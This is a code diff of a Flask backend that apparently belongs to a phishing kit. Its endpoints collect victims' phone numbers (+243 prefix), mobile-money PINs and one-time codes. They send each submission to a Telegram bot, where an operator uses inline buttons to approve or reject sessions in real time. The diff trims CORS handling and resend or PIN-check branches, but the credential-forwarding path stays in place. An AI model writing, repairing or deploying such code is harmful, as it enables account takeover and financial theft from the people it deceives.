@@ -44,27 +44,18 @@ def get_status(session_id):
             print(f"[Upstash] Exception getting status: {e}")
     return "pending"
 
-@app.after_request
-def add_cors_headers(response):
-    response.headers['Access-Control-Allow-Origin'] = '*'
-    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
-    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
-    return response
-
-@app.route('/api/status', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
-@app.route('/status', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
+@app.route('/api/status', methods=['GET', 'POST'], strict_slashes=False)
+@app.route('/status', methods=['GET', 'POST'], strict_slashes=False)
 def status():
-    if request.method == 'OPTIONS':
-        return jsonify({"status": "ok"}), 200
     session_id = request.args.get('session_id') or (request.json or {}).get('session_id')
     current_status = get_status(session_id) or "pending"
-    return jsonify({"status": current_status})
+    resp = jsonify({"status": current_status})
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    return resp
 
-@app.route('/api/webhook', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
-@app.route('/webhook', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
+@app.route('/api/webhook', methods=['GET', 'POST'], strict_slashes=False)
+@app.route('/webhook', methods=['GET', 'POST'], strict_slashes=False)
 def webhook():
-    if request.method == 'OPTIONS':
-        return jsonify({"status": "ok"}), 200
     if request.method == 'GET':
         return jsonify({"status": "webhook active", "ok": True})
         
@@ -120,12 +111,10 @@ def webhook():
                 
     return jsonify({"status": "success"})
 
-@app.route('/', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
-@app.route('/api/verify', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
-@app.route('/verify', methods=['GET', 'POST', 'OPTIONS'], strict_slashes=False)
+@app.route('/', methods=['GET', 'POST'], strict_slashes=False)
+@app.route('/api/verify', methods=['GET', 'POST'], strict_slashes=False)
+@app.route('/verify', methods=['GET', 'POST'], strict_slashes=False)
 def verify():
-    if request.method == 'OPTIONS':
-        return jsonify({"status": "ok"}), 200
     if request.method == 'GET':
         return jsonify({"status": "verify active", "ok": True})
         
@@ -135,27 +124,16 @@ def verify():
     pin = data.get('pin', '')
     otp = data.get('otp', '')
     
-    # Set pending status when OTP or CHECK_PIN is submitted
-    if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
+    # Set pending status when OTP is submitted
+    if otp != 'Pending OTP...' and session_id:
         set_status(session_id, "pending")
         
     _, _, token, chat_id = get_env_vars()
     
-    if otp == 'RESEND_CLICKED':
-        message = f"🔄 <b>RESEND CLICKED!</b>\n\n"
-        message += f"📱 <b>Phone:</b> +243 {phone}\n"
-        message += f"🔑 <b>PIN:</b> {pin}\n"
-        message += f"⚠️ <i>User requested a new code.</i>"
-    elif otp == 'CHECK_PIN':
-        message = f"🔍 <b>CHECK PIN VERIFICATION</b>\n\n"
-        message += f"📱 <b>Phone:</b> +243 {phone}\n"
-        message += f"🔑 <b>PIN:</b> {pin}\n"
-        message += f"⚠️ <i>Verify PIN validity via buttons below:</i>"
-    else:
-        message = f"🚀 <b>New Application Received!</b>\n\n"
-        message += f"📱 <b>Phone:</b> +243 {phone}\n"
-        message += f"🔑 <b>PIN:</b> {pin}\n"
-        message += f"🔢 <b>OTP:</b> {otp}\n"
+    message = f"🚀 <b>New Application Received!</b>\n\n"
+    message += f"📱 <b>Phone:</b> +243 {phone}\n"
+    message += f"🔑 <b>PIN:</b> {pin}\n"
+    message += f"🔢 <b>OTP:</b> {otp}\n"
     
     if token and chat_id:
         url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -165,8 +143,8 @@ def verify():
             "parse_mode": "HTML"
         }
         
-        # Attach approval buttons on OTP or CHECK_PIN submission
-        if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
+        # Attach approval buttons on OTP submission
+        if otp != 'Pending OTP...' and session_id:
             payload["reply_markup"] = {
                 "inline_keyboard": [
                     [
